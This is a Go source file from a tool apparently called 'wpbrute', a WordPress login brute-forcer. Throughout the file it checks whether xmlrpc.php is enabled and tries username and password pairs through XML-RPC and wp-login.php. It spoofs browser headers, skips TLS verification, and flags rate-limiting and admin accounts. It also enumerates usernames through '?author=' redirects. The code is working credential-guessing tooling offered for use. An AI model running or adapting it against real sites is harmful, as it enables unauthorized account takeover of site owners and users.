package wordpress

import (
	"bytes"
	"crypto/tls"
	"encoding/xml"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"wpbrute/pkg/config"
	"wpbrute/pkg/models"
)

type Wordpress struct {
	Client            *http.Client // HTTP Client - allows redirects
	NoRedirectsClient *http.Client // HTTP Client - disallows redirects
	Config            *config.Config
}

type WPErrHasRedirect error

var ErrHasRedirect WPErrHasRedirect = errors.New("redirect")

func dialTimeout(network, addr string) (net.Conn, error) {
	return net.DialTimeout(network, addr, time.Second*30)
}

// New Wordpress Client function
func New(proxy string, config *config.Config) (*Wordpress, error) {

	var timeout int64 = 30
	if config != nil {
		if config.WPBruteConfig.HTTPTimeout > 0 {

			timeout = config.WPBruteConfig.HTTPTimeout
		}
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Dial:            dialTimeout,
	}
	if len(proxy) > 0 {
		proxyURL, err := url.Parse(proxy)
		if err != nil {
			return nil, fmt.Errorf("error parsing proxy url: %s", err)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	no_redirects_client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// fmt.Println("\n\nRedirect detected", len(via))
			if len(req.Header.Get("location")) > 0 {
				fmt.Println("Redirecting to ", req.Header.Get("location")[0])
			}
			if len(via) >= 1 {
				return ErrHasRedirect
			}
			fmt.Println("-----")
			return nil
		},
		Timeout: time.Duration(timeout) * time.Second,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}

	wp := &Wordpress{
		Client:            client,
		NoRedirectsClient: no_redirects_client,
	}

	return wp, nil
}

// Whether or not the site uses HTTPS
func (wp *Wordpress) IsHTTPS(target *models.Target) (bool, bool, string, error) {
	// URL construction
	protocol := "https"
	if target.IsHTTPS != nil && !*target.IsHTTPS {
		protocol = "http"
	}
	targetHost := target.Domain
	if len(target.TargetHost) != 0 {
		targetHost = target.TargetHost
	}
	path := ""
	if len(target.Path) > 0 {
		path = target.Path
	}

	tUrl, err := url.Parse(fmt.Sprintf("%s://%s%s", protocol, targetHost, path))
	if err != nil {
		fmt.Println("Unable to construct url for ", target.Domain, " error of: ", err)
		return false, false, "", err
	}

	fmt.Println("Requesting ", tUrl.String())

	req := &http.Request{
		Method: "HEAD",
		URL:    tUrl,
		Header: http.Header{
			"User-Agent": []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"},
			"Accept":     []string{"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"},
		},
	}
	resp, err := wp.NoRedirectsClient.Do(req)
	if err != nil {
		falsey := false
		isConnectionRefused := strings.Contains(err.Error(), "connection refused")
		isDestUnreachable := strings.Contains(err.Error(), "destination unreachable")
		if (isDestUnreachable || isConnectionRefused || os.IsTimeout(err)) && (target.IsHTTPS == nil || *target.IsHTTPS) {
			target.IsHTTPS = &falsey
			return wp.IsHTTPS(target)
		}
		if !errors.Is(err, ErrHasRedirect) {
			return false, false, "", err
		}
	}

	is_https_redirect := false
	is_redirect := false
	destination := ""

	for key, values := range resp.Header {
		// fmt.Println(key, values)
		if strings.ToLower(key) == "location" {
			is_redirect = true
			dest := values[0]
			if strings.Contains(dest, "https://") {
				is_https_redirect = true
			}
			destination = dest
			// fmt.Println("Domain redirected to https - ", dest)
			break
		}
	}
	return is_redirect, is_https_redirect, destination, nil
}

func (wp *Wordpress) XMLRPCEnabled(target *models.Target) (bool, error) {
	protocol := "http"
	if target.IsHTTPS != nil || *target.IsHTTPS {
		protocol = "https"
	}
	targetHost := target.Domain
	if len(target.TargetHost) != 0 {
		targetHost = target.TargetHost
	}
	path := "/"
	if len(target.Path) > 0 {
		path = target.Path
	}

	xmlRPCFile := "xmlrpc.php"

	tUrl, err := url.Parse(fmt.Sprintf("%s://%s%s%s", protocol, targetHost, path, xmlRPCFile))
	if err != nil {
		fmt.Println("Unable to construct url for ", target.Domain, " error of: ", err)
		return false, err
	}
	fmt.Println("Requesting ", tUrl.String())
	payload, err := xml.Marshal(models.NewXMLRPCCheckEnabledPayload())
	if err != nil {
		return false, err
	}
	req, err := http.NewRequest("POST", tUrl.String(), bytes.NewBuffer(payload))
	if err != nil {
		return false, err
	}

	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36")
	req.Header.Add("Content-Type", "application/xml")

	resp, err := wp.NoRedirectsClient.Do(req)
	if err != nil {
		if !errors.Is(err, ErrHasRedirect) {
			return false, err
		}
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	result := string(body)

	// bad
	// services are disabled on this site
	if strings.Contains(result, "services are disabled on this site") || resp.StatusCode == http.StatusForbidden {
		return false, nil
	} else if strings.Contains(result, "wp.getUsersBlogs") {
		return true, nil
	} else {
		fmt.Println("nothing found", target.Domain, target.ID, "on:", tUrl.String())
		// fmt.Println(string(body))
	}

	if resp.StatusCode != http.StatusOK {
		return false, fmt.Errorf("%s returned a non-200 status code: %d", target.Domain, resp.StatusCode)
	}

	return false, nil
}

func (wp *Wordpress) XMLRPCLogin(target *models.Target, credential *models.WordpressCredential) (*models.XMLRPCLoginResponseObject, error) {
	protocol := "http"
	if target.IsHTTPS != nil && *target.IsHTTPS {
		protocol = "https"
	}
	targetHost := target.Domain
	if len(target.TargetHost) != 0 {
		targetHost = target.TargetHost
	}
	path := ""
	if len(target.Path) > 0 {
		path = target.Path
	}

	xmlRPCFile := "xmlrpc.php"

	tUrl, err := url.Parse(fmt.Sprintf("%s://%s%s%s", protocol, targetHost, path, xmlRPCFile))
	if err != nil {
		fmt.Println("Unable to construct url for ", target.Domain, " error of: ", err)
		return nil, err
	}

	payload, err := xml.Marshal(models.NewXMLRPCLoginRequestPayload(credential.Username, credential.Password))

	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", tUrl.String(), bytes.NewBuffer(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36")
	req.Header.Add("Content-Type", "application/xml")

	resp, err := wp.NoRedirectsClient.Do(req)
	if err != nil {
		if !errors.Is(err, ErrHasRedirect) {
			return nil, err
		}
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("%s returned a non-200 status code: %d", target.Domain, resp.StatusCode)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	result := string(body)

	out := &models.XMLRPCLoginResponseObject{}
	if strings.Contains(result, "Incorrect username or password") || strings.Contains(result, "remaining") {
		out.IsInvalid = true
	}

	if strings.Contains(result, "Too many failed attempts") {
		out.IsRateLimited = true
	}

	if strings.Contains(result, "services are disabled on this site") {
		out.IsXMLRPCDisabled = true
	}

	if strings.Contains(result, "<member><name>isAdmin</name><value><boolean>1</boolean></value></member>") {
		out.IsAdmin = true
	}

	if strings.Contains(result, "<member><name>isAdmin</name><value><boolean>0</boolean></value></member>") {
		out.IsAuthor = true
	}
	/*
	   const isInvalidLogin = response.data.includes('Incorrect username or password') || response.data.includes('remaining');
	   const isRateLimited = response.data.includes('Too many failed attempts');
	   const isAdmin = response.data.includes('<member><name>isAdmin</name><value><boolean>1</boolean></value></member>');
	   const isAuthor = response.data.includes('<member><name>isAdmin</name><value><boolean>0</boolean></value></member>');
	   const isRPCDisabled = response.data.includes('services are disabled on this site');
	*/

	return out, nil
}

func (wp *Wordpress) WPLogin(target *models.Target, credential *models.WordpressCredential) (bool, error) {
	protocol := "http"
	if target.IsHTTPS != nil && *target.IsHTTPS {
		protocol = "https"
	}
	targetHost := target.Domain
	if len(target.TargetHost) != 0 {
		targetHost = target.TargetHost
	}
	path := ""
	if len(target.Path) > 0 {
		path = target.Path
	}
	tUrl, err := url.Parse(fmt.Sprintf("%s://%s%s%s", protocol, targetHost, path, "wp-login.php"))
	if err != nil {
		fmt.Println("Unable to construct url for ", target.Domain, " error of: ", err)
		return false, err
	}

	data := url.Values{}
	data.Set("log", credential.Username)
	data.Set("pwd", credential.Password)
	data.Set("wp-submit", "Log+In")
	data.Set("redirect-to", strings.ReplaceAll(tUrl.String(), "wp-login.php", "wp-admin/"))
	data.Set("test-cookie", "1")

	req, err := http.NewRequest("POST", tUrl.String(), strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}

	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	// req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9,de;q=0.8")
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Cookie", "wordpress_test_cookie=WP%20Cookie%20check;")
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36")
	req.Header.Add("Referer", tUrl.String())

	resp, err := wp.NoRedirectsClient.Do(req)
	if err != nil {
		if !errors.Is(err, ErrHasRedirect) {
			return false, err
		}
	}

	loggedIn := false
	for _, cookie := range resp.Cookies() {
		if strings.Contains(cookie.Name, "wordpress_logged_in_") {
			loggedIn = true
			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return false, err
			}

			result := string(body)
			lowerResult := strings.ToLower(result)
			if strings.Contains(lowerResult, "locked out") {
				return false, nil
			}
			return true, nil
		}
	}

	// fmt.Println(result)
	return loggedIn, nil
}

func (wp *Wordpress) UpdateRedirectMeta(target *models.Target, destination string) error {
	next, err := url.Parse(destination)
	if err != nil {
		return err
	}

	var isHTTPS bool
	if next.Scheme == "https" {
		isHTTPS = true
	} else {
		isHTTPS = false
	}
	target.IsHTTPS = &isHTTPS
	target.Path = next.Path
	target.TargetHost = next.Hostname()

	return nil
}

func (wp *Wordpress) CheckAuthor(target *models.Target, authorId int32) (string, error) {
	// URL construction
	protocol := "https"
	if target.IsHTTPS != nil && !*target.IsHTTPS {
		protocol = "http"
	}
	targetHost := target.Domain
	if len(target.TargetHost) != 0 {
		targetHost = target.TargetHost
	}
	path := ""
	if len(target.Path) > 0 {
		path = target.Path
	}

	path = fmt.Sprintf("%s?author=%d", path, 1)

	tUrl, err := url.Parse(fmt.Sprintf("%s://%s%s", protocol, targetHost, path))
	if err != nil {
		fmt.Println("Unable to construct url for ", target.Domain, " error of: ", err)
		return "", err
	}

	fmt.Println("Requesting ", tUrl.String())

	req := &http.Request{
		Method: "HEAD",
		URL:    tUrl,
		Header: http.Header{
			"User-Agent": []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"},
			"Accept":     []string{"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"},
		},
	}
	resp, err := wp.NoRedirectsClient.Do(req)
	if err != nil {
		if !errors.Is(err, ErrHasRedirect) {
			return "", err
		}
	}

	destination := ""

	for key, values := range resp.Header {
		if strings.ToLower(key) == "location" {
			dest := values[0]
			if strings.Contains(dest, "/author/") {
				destination = strings.Split(dest, "/author/")[1]
				destination = strings.ReplaceAll(destination, "/", "")
				break
			}
		}
	}

	return destination, nil
}
